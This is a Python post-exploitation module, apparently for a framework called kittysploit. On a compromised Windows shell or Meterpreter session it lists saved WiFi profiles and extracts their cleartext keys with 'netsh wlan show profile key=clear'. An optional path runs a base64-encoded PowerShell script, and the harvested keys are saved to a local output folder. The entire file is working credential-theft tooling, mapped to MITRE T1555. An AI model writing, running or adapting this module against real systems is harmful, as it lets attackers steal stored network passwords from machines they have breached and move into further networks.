#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Extract saved WiFi profile keys from a Windows shell or Meterpreter session using
netsh wlan, then display and save the results under ./output.

Works from cmd.exe sessions (no PowerShell required). Optional PowerShell path
is kept as a fallback when available.
"""

from kittysploit import *
import base64
import os
import re
import time

_LOCAL_OUT = "output"

_PROFILE_LINE = re.compile(
    r"(?:All User Profile|Profil Tous les utilisateurs|"
    r"Perfil de todos los usuarios|Benutzerprofil)\s*:\s*(.+)\s*$",
    re.I,
)


class Module(Post):
    __info__ = {
        "name": "Windows Gather WiFi Keys",
        "description": (
            "List saved WLAN profiles and extract cleartext PSKs with "
            "'netsh wlan show profile key=clear' on a Windows shell or Meterpreter session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1555/",
        ],
    }

    save_local = OptBool(True, "Save wlankeys.txt under ./output", False)
    prefer_powershell = OptBool(
        False,
        "Prefer PowerShell wrapper when available (default: netsh via cmd)",
        False,
        True,
    )

    def _execute_cmd(self, command: str) -> str:
        if not command:
            return ""
        output = self.cmd_execute(command)
        return output.strip() if output else ""

    def _encode_powershell(self, script: str) -> str:
        return base64.b64encode(script.encode("utf-16le")).decode("ascii")

    def _run_powershell(self, script: str) -> str:
        encoded = self._encode_powershell(script)
        return self._execute_cmd(f"powershell -NoP -NonI -EncodedCommand {encoded}")

    def _bool_opt(self, val, default=False) -> bool:
        if val is None:
            return default
        if isinstance(val, bool):
            return val
        return str(val).strip().lower() in ("1", "true", "yes", "on")

    def _powershell_available(self) -> bool:
        # Try a few invocations — session framing can swallow a bare "1"
        for cmd in (
            'powershell -NoP -NonI -Command "Write-Output PS_OK"',
            'powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
            r'%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -Command "Write-Output PS_OK"',
        ):
            out = self._execute_cmd(cmd)
            if out and "PS_OK" in out:
                return True
        return False

    def _powershell_script(self) -> str:
        return r"""
function Get-WiFiKeys {
    [CmdletBinding()]
    Param()

    $profileLines = netsh wlan show profiles 2>&1
    if ($LASTEXITCODE -ne 0) {
        throw "netsh wlan show profiles failed: $($profileLines -join ' ')"
    }

    $profileNames = $profileLines | Where-Object {
        $_ -match 'All User Profile|Profil Tous les utilisateurs|Perfil de todos los usuarios|Benutzerprofil'
    } | ForEach-Object {
        if ($_ -match ':\s*(.+)\s*$') { $matches[1].Trim() }
    } | Where-Object { $_ }

    if (-not $profileNames) {
        Write-Output "No saved WiFi profiles found for the current user."
        return
    }

    $sections = New-Object System.Collections.Generic.List[string]
    foreach ($network in $profileNames) {
        $detail = netsh wlan show profile name="$network" key=clear 2>&1
        if ($LASTEXITCODE -ne 0) {
            $sections.Add("=== Profile: $network (failed) ===`n$detail")
            continue
        }
        $sections.Add("=== Profile: $network ===`n$detail")
    }

    $sections -join "`n`n"
}
$ErrorActionPreference = 'Stop'
Get-WiFiKeys
"""

    def _parse_profile_names(self, profiles_out: str) -> list:
        names = []
        for line in (profiles_out or "").splitlines():
            m = _PROFILE_LINE.search(line.strip())
            if m:
                name = m.group(1).strip()
                if name:
                    names.append(name)
        # Preserve order, drop dupes
        seen = set()
        ordered = []
        for n in names:
            key = n.lower()
            if key not in seen:
                seen.add(key)
                ordered.append(n)
        return ordered

    def _extract_via_netsh(self) -> str:
        profiles_out = self._execute_cmd("netsh wlan show profiles")
        if not profiles_out:
            return ""
        if re.search(r"netsh wlan show profiles failed|not supported|not available", profiles_out, re.I):
            return f"netsh wlan show profiles failed: {profiles_out}"

        names = self._parse_profile_names(profiles_out)
        if not names:
            return "No saved WiFi profiles found for the current user."

        sections = []
        for network in names:
            # Escape embedded quotes for cmd
            safe = network.replace('"', '""')
            detail = self._execute_cmd(f'netsh wlan show profile name="{safe}" key=clear')
            if not detail:
                sections.append(f"=== Profile: {network} (failed / empty) ===")
                continue
            sections.append(f"=== Profile: {network} ===\n{detail}")
        return "\n\n".join(sections)

    def check(self):
        netsh_check = self._execute_cmd("where netsh")
        if not netsh_check or "netsh" not in netsh_check.lower():
            # Fallback: try invoking netsh directly
            probe = self._execute_cmd("netsh /?")
            if not probe or "wlan" not in probe.lower() and "show" not in probe.lower():
                print_error("netsh.exe is not available on the target")
                return False

        wlan_check = self._execute_cmd("netsh wlan show interfaces")
        if wlan_check and re.search(r"(not supported|not available|not present|n.est pas)", wlan_check, re.I):
            print_warning("WLAN stack may be unavailable on this host")
        return True

    def _save_output(self, content: str) -> str:
        os.makedirs(_LOCAL_OUT, exist_ok=True)
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_path = os.path.join(_LOCAL_OUT, f"wifi_keys_{stamp}.txt")
        with open(local_path, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        return local_path

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotCompatible, "WiFi key extraction prerequisites not met")

        print_status("Extracting saved WiFi profile keys...")
        use_ps = self._bool_opt(self.prefer_powershell, False) and self._powershell_available()
        if use_ps:
            print_info("Using PowerShell wrapper")
            result = self._run_powershell(self._powershell_script())
        else:
            if self._bool_opt(self.prefer_powershell, False):
                print_warning("PowerShell preferred but not available — falling back to netsh/cmd")
            result = self._extract_via_netsh()

        if not result:
            raise ProcedureError(FailureType.Unknown, "No output was returned by WiFi key extraction")

        if re.search(r"netsh wlan show profiles failed", result, re.I):
            print_error(result)
            raise ProcedureError(FailureType.NotCompatible, result)

        if re.search(r"No saved WiFi profiles found", result, re.I):
            print_warning(result)
            return True

        if self._bool_opt(self.save_local, True):
            local_path = self._save_output(result + "\n")
            rel = os.path.join(".", local_path)
            print_success(f"WiFi keys saved to {rel}")

        print_success("WiFi key extraction completed")
        print_info(result)
        return True
